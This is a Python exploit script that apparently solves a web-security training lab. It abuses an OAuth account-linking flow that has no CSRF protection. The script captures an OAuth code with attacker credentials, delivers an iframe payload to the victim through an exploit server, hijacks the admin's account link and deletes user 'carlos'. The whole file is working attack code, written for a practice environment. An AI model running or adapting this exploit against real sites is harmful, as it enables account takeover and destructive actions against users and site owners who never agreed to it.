import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def extract_oauth_url(text):
    soup = BeautifulSoup(text, 'html.parser')
    oauth_url = soup.find('form').find('a').get('href') # type: ignore
    return oauth_url

def extract_uid(text):
    soup = BeautifulSoup(text, 'html.parser')
    path = soup.find('form').get('action') # type: ignore
    return path.split('/')[2] # type: ignore

def oauth_process(s, oauth_url, oauth_path):
    # authorization
    auth_url = oauth_url + oauth_path
    r = s.get(auth_url, allow_redirects=True)
    uid = extract_uid(r.text)

    # login
    login_url = oauth_url + f'/interaction/{uid}/login'
    payload = {
        'username': 'peter.wiener',
        'password': 'hotdog'
    }
    r = s.post(login_url, data=payload)

    # consent
    consent_url = oauth_url + f'/interaction/{uid}/confirm'
    r = s.post(consent_url, allow_redirects=False)
    
    # get oauth code
    auth_url = oauth_url + f'/auth/{uid}'
    r = s.get(auth_url, allow_redirects=False)
    oauth_code = r.text.split('code=')[1][:-1]
    
    return oauth_code

def oauth_login_url(s, url, path):
    target = url + path
    r = s.get(target)
    oauth_url = extract_oauth_url(r.text)

    if oauth_url:
        print(f'[+] Found oauth url = {oauth_url}')
        return oauth_url
    else:
        print('[-] Not fount oauth url')
        sys.exit(-1)

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)

def send_payload_to_victim(s, exploit_url, exploit_path, payload): 
    target_url = exploit_url + exploit_path
    payload = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK \
                        Content-Type: text/html; charset=utf-8',
        'responseBody': payload,
        'formAction': 'DELIVER_TO_VICTIM'
    }
    r = s.post(target_url, data=payload, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Sent vuln request to exploit CORS vuln')
    else:
        print('[-] Fail to send vuln request')
        sys.exit(-1)

def delete_user(s, url, path, username):
    target_url = url + path + f'?username={username}'
    r = s.get(target_url, allow_redirects=True)
    
    if 'User deleted successfully!' in r.text and r.status_code == 200:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    oauth = oauth_login_url(s, url, '/login')
    oauth_url = oauth.split('/auth')[0]
    oauth_path = oauth.split(oauth_url)[1]

    oauth_code = oauth_process(s, oauth_url, oauth_path)

    payload = f'<iframe src="{url}/oauth-linking?code={oauth_code}"></iframe>'
    send_payload_to_victim(s, exploit_url, '/', payload)
    goto(s, oauth_url, oauth_path)
    delete_user(s, url, '/admin/delete', 'carlos')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()